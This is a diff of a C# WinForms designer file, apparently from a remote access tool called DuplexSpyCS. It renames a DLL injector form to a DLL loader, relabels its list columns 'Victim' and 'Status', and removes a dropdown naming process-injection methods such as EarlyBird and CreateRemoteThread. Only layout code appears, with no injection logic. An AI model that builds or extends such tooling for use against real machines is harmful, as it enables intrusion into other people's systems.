@@ -1,6 +1,6 @@
 ﻿namespace DuplexSpyCS
 {
-    partial class frmTaskDLLInjector
+    partial class frmDllLoader
     {
         /// <summary>
         /// Required designer variable.
@@ -28,10 +28,6 @@
         /// </summary>
         private void InitializeComponent()
         {
-            button1 = new Button();
-            textBox1 = new TextBox();
-            label1 = new Label();
-            button2 = new Button();
             tabControl1 = new TabControl();
             tabPage1 = new TabPage();
             statusStrip1 = new StatusStrip();
@@ -41,62 +37,27 @@
             columnHeader2 = new ColumnHeader();
             tabPage2 = new TabPage();
             richTextBox1 = new RichTextBox();
-            label2 = new Label();
-            comboBox1 = new ComboBox();
+            button2 = new Button();
+            label1 = new Label();
+            textBox1 = new TextBox();
+            button1 = new Button();
             tabControl1.SuspendLayout();
             tabPage1.SuspendLayout();
             statusStrip1.SuspendLayout();
             tabPage2.SuspendLayout();
             SuspendLayout();
             // 
-            // button1
-            // 
-            button1.Location = new Point(312, 42);
-            button1.Margin = new Padding(4);
-            button1.Name = "button1";
-            button1.Size = new Size(96, 29);
-            button1.TabIndex = 0;
-            button1.Text = "...";
-            button1.UseVisualStyleBackColor = true;
-            button1.Click += button1_Click;
-            // 
-            // textBox1
-            // 
-            textBox1.Location = new Point(93, 44);
-            textBox1.Name = "textBox1";
-            textBox1.Size = new Size(212, 27);
-            textBox1.TabIndex = 1;
-            // 
-            // label1
-            // 
-            label1.AutoSize = true;
-            label1.Location = new Point(47, 47);
-            label1.Name = "label1";
-            label1.Size = new Size(40, 19);
-            label1.TabIndex = 2;
-            label1.Text = "File :";
-            // 
-            // button2
-            // 
-            button2.Location = new Point(16, 78);
-            button2.Name = "button2";
-            button2.Size = new Size(392, 38);
-            button2.TabIndex = 5;
-            button2.Text = "Inject";
-            button2.UseVisualStyleBackColor = true;
-            button2.Click += button2_Click;
-            // 
             // tabControl1
             // 
             tabControl1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
             tabControl1.Controls.Add(tabPage1);
             tabControl1.Controls.Add(tabPage2);
-            tabControl1.Location = new Point(3, 122);
+            tabControl1.Location = new Point(-1, 85);
             tabControl1.Name = "tabControl1";
             tabControl1.SelectedIndex = 0;
-            tabControl1.Size = new Size(415, 390);
+            tabControl1.Size = new Size(417, 477);
             tabControl1.SizeMode = TabSizeMode.Fixed;
-            tabControl1.TabIndex = 6;
+            tabControl1.TabIndex = 11;
             // 
             // tabPage1
             // 
@@ -105,18 +66,18 @@
             tabPage1.Location = new Point(4, 28);
             tabPage1.Name = "tabPage1";
             tabPage1.Padding = new Padding(3);
-            tabPage1.Size = new Size(407, 358);
+            tabPage1.Size = new Size(409, 445);
             tabPage1.TabIndex = 0;
-            tabPage1.Text = "Process";
+            tabPage1.Text = "Victim";
             tabPage1.UseVisualStyleBackColor = true;
             // 
             // statusStrip1
             // 
             statusStrip1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
             statusStrip1.Items.AddRange(new ToolStripItem[] { toolStripStatusLabel1 });
-            statusStrip1.Location = new Point(3, 331);
+            statusStrip1.Location = new Point(3, 418);
             statusStrip1.Name = "statusStrip1";
-            statusStrip1.Size = new Size(401, 24);
+            statusStrip1.Size = new Size(403, 24);
             statusStrip1.TabIndex = 1;
             statusStrip1.Text = "statusStrip1";
             // 
@@ -133,19 +94,19 @@
             listView1.FullRowSelect = true;
             listView1.Location = new Point(3, 3);
             listView1.Name = "listView1";
-            listView1.Size = new Size(401, 352);
+            listView1.Size = new Size(403, 439);
             listView1.TabIndex = 0;
             listView1.UseCompatibleStateImageBehavior = false;
             listView1.View = View.Details;
             // 
             // columnHeader1
             // 
-            columnHeader1.Text = "Process";
+            columnHeader1.Text = "Victim";
             columnHeader1.Width = 200;
             // 
             // columnHeader2
             // 
-            columnHeader2.Text = "PID";
+            columnHeader2.Text = "Status";
             columnHeader2.Width = 200;
             // 
             // tabPage2
@@ -154,7 +115,7 @@
             tabPage2.Location = new Point(4, 24);
             tabPage2.Name = "tabPage2";
             tabPage2.Padding = new Padding(3);
-            tabPage2.Size = new Size(407, 362);
+            tabPage2.Size = new Size(409, 449);
             tabPage2.TabIndex = 1;
             tabPage2.Text = "Logs";
             tabPage2.UseVisualStyleBackColor = true;
@@ -164,35 +125,52 @@
             richTextBox1.Dock = DockStyle.Fill;
             richTextBox1.Location = new Point(3, 3);
             richTextBox1.Name = "richTextBox1";
-            richTextBox1.Size = new Size(401, 356);
+            richTextBox1.Size = new Size(403, 443);
             richTextBox1.TabIndex = 0;
             richTextBox1.Text = "";
             // 
-            // label2
+            // button2
             // 
-            label2.AutoSize = true;
-            label2.Location = new Point(17, 11);
-            label2.Name = "label2";
-            label2.Size = new Size(71, 19);
-            label2.TabIndex = 7;
-            label2.Text = "Method :";
+            button2.Location = new Point(12, 41);
+            button2.Name = "button2";
+            button2.Size = new Size(392, 39);
+            button2.TabIndex = 10;
+            button2.Text = "Inject";
+            button2.UseVisualStyleBackColor = true;
+            button2.Click += button2_Click;
             // 
-            // comboBox1
+            // label1
             // 
-            comboBox1.FormattingEnabled = true;
-            comboBox1.Items.AddRange(new object[] { "APC", "EarlyBird", "CreateRemoteThread", "NtCreateThreadEx", "ZwCreateThreadEx" });
-            comboBox1.Location = new Point(94, 8);
-            comboBox1.Name = "comboBox1";
-            comboBox1.Size = new Size(314, 27);
-            comboBox1.TabIndex = 8;
+            label1.AutoSize = true;
+            label1.Location = new Point(12, 11);
+            label1.Name = "label1";
+            label1.Size = new Size(40, 19);
+            label1.TabIndex = 9;
+            label1.Text = "File :";
             // 
-            // frmTaskDLLInjector
+            // textBox1
+            // 
+            textBox1.Location = new Point(58, 8);
+            textBox1.Name = "textBox1";
+            textBox1.Size = new Size(243, 27);
+            textBox1.TabIndex = 8;
+            // 
+            // button1
+            // 
+            button1.Location = new Point(308, 5);
+            button1.Margin = new Padding(4);
+            button1.Name = "button1";
+            button1.Size = new Size(96, 30);
+            button1.TabIndex = 7;
+            button1.Text = "...";
+            button1.UseVisualStyleBackColor = true;
+            button1.Click += button1_Click;
+            // 
+            // frmDllLoader
             // 
             AutoScaleDimensions = new SizeF(9F, 19F);
             AutoScaleMode = AutoScaleMode.Font;
-            ClientSize = new Size(420, 512);
-            Controls.Add(comboBox1);
-            Controls.Add(label2);
+            ClientSize = new Size(417, 564);
             Controls.Add(tabControl1);
             Controls.Add(button2);
             Controls.Add(label1);
@@ -202,11 +180,11 @@
             FormBorderStyle = FormBorderStyle.FixedToolWindow;
             Margin = new Padding(4);
             MaximizeBox = false;
-            Name = "frmTaskDLLInjector";
+            Name = "frmDllLoader";
             StartPosition = FormStartPosition.CenterScreen;
-            Text = "frmTaskDLLInjector";
-            FormClosed += frmTaskDLLInjector_FormClosed;
-            Load += frmTaskDLLInjector_Load;
+            Text = "frmDllLoader";
+            FormClosed += frmDllLoader_FormClosed;
+            Load += frmDllLoader_Load;
             tabControl1.ResumeLayout(false);
             tabPage1.ResumeLayout(false);
             tabPage1.PerformLayout();
@@ -219,20 +197,18 @@
 
         #endregion
 
-        private Button button1;
-        private TextBox textBox1;
-        private Label label1;
-        private Button button2;
         private TabControl tabControl1;
         private TabPage tabPage1;
         private StatusStrip statusStrip1;
         private ToolStripStatusLabel toolStripStatusLabel1;
         private ListView listView1;
-        private TabPage tabPage2;
         private ColumnHeader columnHeader1;
         private ColumnHeader columnHeader2;
+        private TabPage tabPage2;
         private RichTextBox richTextBox1;
-        private Label label2;
-        private ComboBox comboBox1;
+        private Button button2;
+        private Label label1;
+        private TextBox textBox1;
+        private Button button1;
     }
 }
